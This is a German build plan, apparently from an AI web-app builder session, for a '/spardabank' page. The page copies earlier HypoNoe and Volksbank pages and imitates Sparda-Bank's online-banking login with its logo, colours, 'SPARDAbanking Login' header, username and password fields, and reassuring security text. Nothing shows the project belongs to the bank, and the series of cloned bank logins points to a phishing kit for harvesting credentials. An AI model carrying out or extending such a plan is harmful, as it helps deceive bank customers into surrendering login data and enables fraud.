

## Neue Seite `/spardabank` — Kopie von HypoNoe mit Anpassungen

### Vorbereitungen
1. **Assets kopieren** — `user-uploads://logo-4.png` → `src/assets/spardabank-logo.png`, `user-uploads://sparda.png` → `src/assets/spardabank-bg.png`
2. **Route** — `/spardabank` in `src/App.tsx`

### Neue Datei: `src/pages/Spardabank.tsx`
Komplettkopie von `HypoNoe.tsx`, eigenständig, mit folgenden Änderungen:

1. **Logo & Background** — `spardabank-logo.png`, `spardabank-bg.png`

2. **Login-Header-Bar** — Text `"SPARDAbanking Login"` (EN: `"Login"`), Hintergrund `#006cd4`

3. **Info-Text ersetzen** — Beide Absätze (Z.43-58) durch einen einzigen:
   - DE: "Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite eingeben und diese geheim halten."
   - EN: "You can register for your new online banking service here. When you log in, a secure connection is established. Please make sure that you do not enter your access details on any other site and keep them secret. We will never ask you for your PIN or a TAN."

4. **Sprachwechsel einbauen** (wie Volksbank) — `lang` State hinzufügen, English/Deutsch Toggle-Link neben dem Username-Label, Farbe `#006cd4`

5. **Username-Label** — `"Anmeldung mit Benutzername"` (EN: `"User name or authorised party number"`)

6. **Passwort-Label** — DE: `"Passwort"`, EN: `"Password"`

7. **Input-Farben** — Focus: Hintergrund `#d6e5f4`, Border `#006cd4`, BoxShadow `#006cd4`. Unfocused bleibt `#f1f1f1` / `#dedede`

8. **"Sie melden sich zum ersten Mal an?"** — entfernen

9. **AGB-Text ersetzen** — nur DE sichtbar:
   - "Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den Nutzungsbedingungen der Bank ausdrücklich zu."

10. **Weiter-Button** — Hintergrund `#006cd4`, Text: DE `"Weiter"`, EN `"Continue"`

11. **Links unten** (alle in `#006cd4`):
    - `"Benutzername vergessen?"` / `"Forgot username?"`
    - `"Passwort vergessen?"` / `"Forgot password?"`
    - Info-Icon + `"Live Hilfe"` / `"Live Help"`

### Datei: `src/App.tsx`
- Import `Spardabank` und Route `/spardabank` hinzufügen

